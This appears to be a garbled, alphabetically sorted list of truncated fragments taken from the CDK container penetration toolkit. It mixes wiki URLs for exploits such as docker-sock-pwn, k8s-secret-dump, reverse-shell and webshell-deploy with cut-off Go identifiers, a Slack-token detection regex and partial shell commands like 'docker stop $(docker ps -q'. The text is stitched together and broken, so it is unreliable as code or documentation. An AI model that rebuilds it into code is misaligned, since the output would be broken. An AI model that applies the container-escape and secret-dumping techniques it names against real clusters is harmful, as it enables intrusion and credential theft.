+(https://github.com/cdk-team/CDK/wiki/Exploit:-docker-api-pwn
+(https://github.com/cdk-team/CDK/wiki/Exploit:-docker-sock-check
+(https://github.com/cdk-team/CDK/wiki/Exploit:-docker-sock-deploy
+(https://github.com/cdk-team/CDK/wiki/Exploit:-docker-sock-pwn
+(https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-backdoor-daemonset
+(https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-configmap-dump
+(https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-cronjob
+(https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-get-sa-token
+(https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-psp-dump
+(https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-secret-dump
+(https://github.com/cdk-team/CDK/wiki/Exploit:-k8s-shadow-apiserver
+(https://github.com/cdk-team/CDK/wiki/Exploit:-lxcfs-rw
+(https://github.com/cdk-team/CDK/wiki/Exploit:-mount-cgroup
+(https://github.com/cdk-team/CDK/wiki/Exploit:-mount-disk
+(https://github.com/cdk-team/CDK/wiki/Exploit:-mount-procfs
+(https://github.com/cdk-team/CDK/wiki/Exploit:-reverse-shell
+(https://github.com/cdk-team/CDK/wiki/Exploit:-rewrite-cgroup-devices
+(https://github.com/cdk-team/CDK/wiki/Exploit:-service-probe
+(https://github.com/cdk-team/CDK/wiki/Exploit:-shim-pwn
+(https://github.com/cdk-team/CDK/wiki/Exploit:-webshell-deploy
+(https://github.com/cdk-team/CDK/wiki/Release
+(https://github.com/cdk-team/CDK/wiki/Run-Test
+(https://github.com/cdk-team/CDK/wiki/Tool:-dcurl
+(https://github.com/cdk-team/CDK/wiki/Tool:-ifconfig
+(https://github.com/cdk-team/CDK/wiki/Tool:-kcurl
+(https://github.com/cdk-team/CDK/wiki/Tool:-nc
+(https://github.com/cdk-team/CDK/wiki/Tool:-probe
+(https://github.com/cdk-team/CDK/wiki/Tool:-ps
+(https://github.com/cdk-team/CDK/wiki/Tool:-ucurl
+(https://github.com/cdk-team/CDK/wiki/Tool:-vi
+(https://github.com/kingkaki
+(https://github.com/kingkaki.png?size=40
+(https://github.com/knownsec/404StarLink-Project/raw/master/logo.png
+(https://github.com/knownsec/404StarLink2.0-Galaxy
+(https://github.com/knownsec/404StarLink2.0-Galaxy#community
+(https://github.com/kubernetes/dns/blob/master/docs/specification.md
+(https://github.com/mzet-/linux-exploit-suggester
+(https://github.com/neargle/slidefiles/blob/main/2021%20WHC2021%20CDK-Also-a-Awesome-BugBounty-Tool-for-Cloud-Platform.pptx.pdf
+(https://github.com/wywwzjj
+(https://github.com/wywwzjj.png?size=40
+(https://github.com/yeahx
+(https://github.com/yeahx.png?size=40
+(https://kubernetes.io/docs/concepts/policy/pod-security-policy/
+(https://user-images.githubusercontent.com/7868679/177925206-8d83dc95-0f2f-4d61-9a45-0d43b1b0468f.png
+(https://www.blackhat.com/asia-21/arsenal/schedule/index.html#cdk-zero-dependency-container-penetration-toolkit-22422
+(i
+(id
+(if non-empty
+(if present
+(if run with --skip-pkg-versions
+(ii
+(iii
+(including fsuid
+(including negligence
+(input
+(input string
+(ip string
+(ipRange string
+(ipd32
+(json
+(json string
+(k
+(kcurlBanner
+(kernel or package name
+(key
+(key string
+(kubectl in master node
+(l *LevelLogger
+(l lxcfsRWCgroup
+(l lxcfsRWS
+(letterBytes
+(letterBytes[idx]
+(lines
+(lines[i]
+(logLinkRegx
+(lst
+(lst []string
+(lst[1]
+(m.Device
+(m.Fstype
+(m.Root
+(m.String(
+(map[string]ExploitInterface
+(map[string]TaskInterface
+(map[string]bool
+(map[string]string
+(mask
+(mask uint64
+(matches
+(mi *MountInfo
+(mi *util.MountInfo
+(mi MountInfo
+(mi.MountPoint
+(min|hour|day|<cron-expr>
+(mountInfoPath
+(mountInfos
+(mountInfos []util.MountInfo
+(mountedDirs
+(msg.format(result
+(n
+(n int
+(name
+(name string
+(not implemented
+(not resolved yet
+(on your host
+(only for deb|ubuntu|RHEL and if we know distro version - direct mode
+(only for display purposes
+(opt
+(opt EtcdRequestOption
+(opt.TlsConfig.Certificates
+(opts
+(opts K8sRequestOption
+(opts.Method
+(opts.Token
+(opts.TokenPath
+(opts.Url
+(optsDeploy
+(optsSvc
+(or bind by name
+(or derived from
+(orginal exploit author
+(orig
+(orig []byte
+(orig[l:n]
+(original exploit author: Max Kellermann
+(os.Args
+(os.Stdin
+(out
+(out string
+(output.String(
+(ovl_setattr
+(p
+(p CapDacReadSearch
+(p DINDAttackDeployS
+(p DINDAttackS
+(p DockerRemoteAPIS
+(p EtcdGetToken
+(p ExploitCgroupS
+(p FileScanS
+(p K8SPodSecurityPolicy
+(p K8sBackDoorDaemonsetS
+(p K8sCronJobDeployS
+(p K8sGetSATokenViaCreatePodS
+(p K8sMitmClusteripS
+(p K8sSecretsDumpS
+(p K8sShadowApiServerS
+(p KubeletExec
+(p PidInject
+(p RegistryBruteS
+(p TESTExploit
+(p VarLogEscape
+(p []byte
+(p cgroupDevicesExploitS
+(p containerdShimPwnS
+(p dockerRuncPwnS
+(p dumpK8sConfigmapS
+(p istioCheckS
+(p mountDeviceS
+(p mountProcfsExpS
+(p reverseShellS
+(p serviceProbeS
+(p taskAutoEscapeS
+(p webShellDeployS
+(p.Desc(
+(parallel
+(params
+(parts
+(parts[0]
+(parts[1]
+(passwordInput
+(path
+(path string
+(pattern.FindAllStringSubmatch(string(actualStdout
+(pattern.FindAllStringSubmatch(string(expectedStdout
+(payloadData
+(php|jsp
+(pid
+(pid int
+(pidDir
+(pids
+(podName[1]
+(port
+(portRange
+(ppc
+(printf '\033'
+(printk behaviour
+(ps *PortScanner
+(ps.ipRange
+(pspRegexPat
+(pwd
+(query string
+(r
+(r'docker stop $(docker ps -q
+(r.String(
+(realtime
+(releaseAgentPath
+(req
+(request
+(res
+(res Result
+(res.ToJson(
+(resBytes
+(resp
+(resp.Body
+(respSvc
+(result
+(results
+(ret.stderr.read(
+(ret.stdout.read(
+(ret1.stdout.read(
+(ret2 & 0xff
+(root user needs to login via ssh to trigger exploitation
+(rpm -qa
+(s
+(s []string
+(s string
+(scanner.Text(
+(scriptType
+(see below
+(see mount(2
+(serverAddr
+(serverAddr string
+(serverVersion
+(server|generic
+(service mesh
+(setstacksize
+(setuidfiles
+(shell
+(shellCmd
+(shellCommand string
+(shellPath string
+(short
+(simple version
+(singleCG[0]
+(sock
+(standard
+(stat.Nlink
+(str
+(str(ret1.stderr.read(
+(str(ret1.stdout.read(
+(string
+(string(content
+(string(data
+(string(name
+(string(out
+(string(output
+(string(raw
+(string(v
+(strings.NewReader(string(data
+(strings.ToUpper(method
+(sudo
+(sys_cacheflush
+(t *testing.T
+(tIp
+(tIp[3]
+(target
+(test/k8s_exploit_yaml/default_to_admin.yaml
+(text
+(text string
+(thanks.md
+(time.Now(
+(time.Second * 2
+(timeout
+(timeoutMS
+(title
+(title string
+(tmplist
+(token
+(tokenFlag
+(tokenPath
+(tokenPath string
+(tt.successStr
+(type of service
+(udp_sendmsg
+(uidMapStr
+(uname -a
+(up to 24h of delay
+(up to one day of delay
+(uri
+(url string
+(usernameInput
+(utsInfo
+(utsInfo.Release[:]
+(v
+(value
+(void
+(will leave a container with image alpine:latest
+(with calculated Rank and highlighted tags
+(writeHandle.Fd(
+(xox[p|b|o|a]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32}
+(your_public_host_ip
